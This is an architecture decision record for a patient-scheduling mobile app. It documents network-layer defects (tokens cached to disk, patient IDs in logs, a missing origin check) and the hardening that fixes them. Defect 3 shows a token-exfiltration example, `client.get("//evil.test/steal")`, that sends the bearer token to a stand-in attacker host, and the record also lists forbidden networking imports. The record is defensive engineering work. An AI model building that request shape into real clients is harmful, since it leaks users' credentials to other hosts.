# ADR-0016 — Transport hardening at the system edge, and two defects the stack was hiding

- **Status:** Accepted · 2026-08-21 (fortification slice F12)
- **Related:** ADR-0004 (the stack this corrects); ADR-0014 (the logout contract the URL cache
  escaped); threat model T5; §7 and §8.1 of this constitution.

## Context

ADR-0004 built a hardened Ktor stack and its documents claimed the transport was closed: https-only
fail-closed, no redirects, TLS ≥ 1.2, cleartext denied in the Android manifest, redacted logging.
An adversarial review of the network layer found that **two of those claims were false and two
defects were live in code this repo had already written**.

## The two defects, with evidence

**1. The iOS URL cache wrote response bodies AND bearer tokens to disk in plaintext.** Ktor 3.5.2's
Darwin engine builds its session from `defaultSessionConfiguration`, whose `URLCache` is
`URLCache.shared` (20 MB, disk-backed). NSURLCache stores **request headers alongside the response
body**, so the `Authorization: Bearer …` this stack attaches would be written to `Library/Caches` —
and would survive logout, whose wipe enumerates `SecureStoreKey` and knows nothing about a URL
cache (ADR-0014). Verified with Swift probes against a real HTTPS GET: absent any `Cache-Control`,
the response IS stored; only `no-store` suppresses it.

The trap that made it easy to miss: Ktor already sets `NSURLRequestReloadIgnoringLocalCacheData` on
every request, which reads as "caching off". It is not — that policy suppresses cache **reads**.
Writes continue. Only removing the cache stops the write.

**2. The "redacted" log kept the full path.** The sink stripped the query and logged
`encodedPath` — but this app's routes carry the identifier IN the path
(`/v1/orgs/{tenantId}/patients/{patientId}/appointments` is the shape the backend publishes). Every
log line would have carried a patient identifier: exactly the §8.1 leak the redacting sink exists
to prevent.

**3. The https guard checked the PROTOCOL, never the ORIGIN — and that was a token-exfiltration
path.** `client.get("//evil.test/steal")` reads like a relative path; `defaultRequest` supplied the
https scheme, the request left for another host **with this app's bearer token attached**, and the
redacted log recorded only `GET /steal` — the host appears nowhere, so the exfiltration was
invisible in the one place the stack does record. Demonstrated against the compiled stack. The
generated contract client ADR-0004 mandates will hand this stack whole URLs out of `next`/`self`
link fields, which is exactly that shape.

**4. Transport and timeout exceptions escaped unmapped, carrying the full URL with its query.**
Ktor's timeout message is `Request timeout has expired [url=https://…/patients/11111111-1?rut=…]`.
Any generic catch, uncaught-exception handler or future crash reporter received the personal datum
the redaction design exists to exclude. Bitácora 0004 recorded this as an ergonomics gap; it was a
data-leak gap.

**5. detekt's `core/` exemption was `**/core/**`, which matches at ANY depth.** Creating
`features/<area>/core/` silently disabled the raw-networking and secrets gates for everything
inside it. Proven with a bait pair: the same detekt run flagged `features/agenda/PlainFeature.kt`
and said nothing about `features/agenda/core/SneakyCore.kt`, which imported both Ktor and OkHttp.

**And one false document:** the stack's KDoc and bitácora 0004 both said only the final response of
a retried call is logged. It logs every attempt — three entries for a GET retried twice.

## Decision

**Every request is pinned to the base URL's ORIGIN** — scheme, host and port — not to "some https
URL". The refusal message names no host, because an error string is a side channel too and this one
is read by whoever triggered it. **Transport failures are mapped at the send hook**, and the engine's
message and cause chain are both dropped rather than chained. **The `core/` exemption is anchored**
to `**/lumemedlink/core/**`, and a new `I5` rule refuses any directory named `core` elsewhere — two
independent gates, because this one hides the disabling of others.

**iOS:** the Darwin engine is configured through a named seam, `applyLumeCachePosture()`, which
sets `URLCache = null` and the ignore-cache policy. `setURLCache(null)` is the load-bearing line;
the policy stays beside it because it is what a reader mistakes for the whole control.

**Path redaction is by construction.** `NetworkLogEntry`'s constructor is private and `of()` is the
only door; it runs every path through `redactPath`, which keeps plain route words and version
segments and replaces everything else with `{id}`. It is an **allowlist**: an unrecognised segment
is redacted rather than kept, so a new identifier shape cannot slip through because nobody added it
to a list of things to hide.

**Android declares its posture to the system**, which it never did before:
`usesCleartextTraffic="false"`, plus a `network_security_config.xml` that denies cleartext and pins
trust anchors to **system certificates only**. The trust-anchor half is the one that buys something
new: a CA installed by an MDM, a corporate proxy or malware cannot intercept this app's TLS on
Android. Declared explicitly rather than inherited because on API 26/27 — inside our minSdk 26
install base — the cleartext default inverts to permitted.

**No `<debug-overrides>`, and the cost is stated:** nobody can inspect this app's traffic with
Charles, mitmproxy or Burp on any build. That is the correct trade for traffic that is a patient
agenda; changing it is a deliberate edit to that file, never a slice's side effect.

**`INTERNET` is declared by us**, even though it already arrived by manifest merge from
`okhttp-android`. A permission that ships because a transitive dependency asked for it is a
permission nobody decided.

## The gate, and why it reads a different file than every other gate

`Scripts/check-network-posture.sh` asserts on the **MERGED** manifest. Every other gate in this repo
reads the manifest we write, and is therefore blind to what dependencies merge in — which is not
hypothetical: `okhttp-android` injects `INTERNET` and `androidx.biometric` injects the deprecated
`USE_FINGERPRINT`, neither present in any source file here. The gate carries a permission allowlist
over the merged set and names the culprit library from the merge blame report when it fails.

It also refuses `network_security_config_debug.xml`, a sibling resource the platform
**auto-discovers** in debuggable builds even though nothing references it.

`ForbiddenImport` gained the holes the review named: `java.net.URL`, `java.net.Socket`,
`javax.net.ssl.*`, `android.webkit.*`, `DownloadManager`, `NSURLSession`, `NSURLConnection`,
`platform.WebKit.*`. Every one opens a socket that never passes the stack.

## Consequences and what is NOT claimed

- **The stack has still never opened a real socket.** All 13 of its tests use MockEngine, and
  `platformHttpEngine()` has no caller in the tree — `lumeHttpClient()` takes the engine as a
  parameter and only tests construct one. What is verified is the stack's logic, never its
  transport. That changes when S1.1 wires a real client.
- **A device test cannot observe the system-level cleartext denial**, because the Kotlin `require`
  in `lumeHttpClient` fires first. Proving the manifest layer needs a client built deliberately
  around the stack — worth doing when there is a real endpoint to point at.
- **iOS is entirely unverified**: no host, so no Info.plist, no ATS evidence, and no way to observe
  the URL cache behaviour on a device. The fix is verified to compile and is verified in principle
  by the probes; it is not verified in this app.
- **Fourth platform asymmetry, now in the threat model:** iOS trusts user-installed root CAs and
  Android does not. Pinning is the only thing that would close it, and ADR-0004 deferred pinning —
  so the iOS side remains interceptable by whoever controls the device.
- **Not closed, registered:** both engines silently honour a system-configured proxy;
  `androidx.emoji2` fetches a font through Play Services outside the stack; TLS metadata (SNI,
  timing) still reveals which host is contacted.
